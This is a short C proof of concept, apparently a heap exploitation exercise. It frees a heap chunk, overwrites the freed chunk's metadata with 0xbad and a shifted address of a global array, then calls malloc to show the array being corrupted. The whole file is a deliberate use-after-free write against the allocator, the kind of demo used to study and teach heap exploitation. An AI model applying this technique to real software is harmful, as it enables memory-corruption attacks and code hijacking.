#include <stdio.h>
#include <stdlib.h>

unsigned long target[4] = {0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef};


int main(void) {
    size_t size = 0x100;
    unsigned long *p, *q, *r, *s;
    p = malloc(size);
    malloc(size);
    q = malloc(size);
    malloc(size);
    r = malloc(size);
    malloc(size);
    s = malloc(size);
    
    printf("p = %p, q = %p, r = %p\n", p, q, r);
    // free(p);
    free(q);
//    free(r);
    // free(s);
    printf("q[0] = %lx, q[1] = %lx\n", q[0], q[1]);
    
    unsigned char checksum_prev, checksum_next;
    checksum_prev = q[0] >> 60;
    checksum_next = q[1] >> 60;
    
    printf("target = %lx, &target = %p\n", target[0], &target);
    q[0] = 0xbad+ 0x0000000000000000;
    q[1] = (((unsigned long)(&target) )>> 4);
    malloc(0x100);
    printf("target = %lx, &target = %p\n", target[0], &target);
    return 0;

}
